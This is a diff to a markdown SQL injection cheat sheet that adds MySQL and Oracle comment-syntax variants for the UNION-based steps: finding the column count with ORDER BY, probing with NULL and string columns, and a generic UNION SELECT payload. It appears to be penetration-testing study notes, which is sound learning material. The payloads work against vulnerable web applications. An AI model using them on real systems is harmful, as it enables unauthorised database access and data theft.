@@ -38,14 +38,13 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 #### 1. Determine number of columns required
 
 - **METHOD 1** :
-	- Use the `ORDER BY` clause and increasing the number by `1` each time until we hit an error to understand the number of columns returned by the original query. The number where we hit the error subtract `-1` to get number of columns. For example : `error at 3 so total columns = 3 - 1 = 2`.
+	- Use the `ORDER BY` clause and increase the number by `1` each time until we hit an error to understand the number of columns returned by the original query. The number where we hit the error subtract `-1` to get number of columns. For example : `error at 3 so total columns = 3 - 1 = 2`.
 		
 	- The number of columns you find here will determine the payload structure of the rest of the steps.
 
 ```sql
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3-- 
+' ORDER BY 1-- -> for oracle
+' ORDER BY 1# -> for mysql
 
 etc...
 ```
@@ -58,15 +57,13 @@ etc...
 
 ```sql
 ' UNION SELECT NULL--
-' UNION SELECT NULL,NULL-- 
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT NULL FROM DUAL-- 
+' UNION SELECT NULL# -> for mysql
+' UNION SELECT NULL FROM DUAL-- -> for oracle
 
-etc...
+etc...'
 /*
 on oracle every select query requires FROM keyword with a valid table name
 DUAL is an oracle inbuilt table present in the database
-
 use + sign to produce spaces in HTTP/HTTPS requests.
 */
 ```
@@ -81,10 +78,8 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 
 ```sql
 ' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL-- 
-' UNION SELECT NULL,NULL,'a',NULL-- 
-' UNION SELECT NULL,NULL,NULL,'a'--
-' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL-- 
+' UNION SELECT 'a',NULL,NULL,NULL# -> for mysql
+' UNION SELECT 'a',NULL,NULL,NULL FROM DUAL--  -> for oracle
 
 
 etc...'
@@ -101,7 +96,8 @@ use + sign to produce spaces in HTTP/HTTPS requests.
 ### **PAYLOADS :**
 
 ```sql
-UNION SELECT <columns> FROM <table name>--
+UNION SELECT <columns> FROM <table name>-- -> for oracle
+UNION SELECT <columns> FROM <table name># -> for mysql
 /*
 the number of columns will vary based on what we find in the requirements phase
 the order, number of columns everything depends on the requirement phase
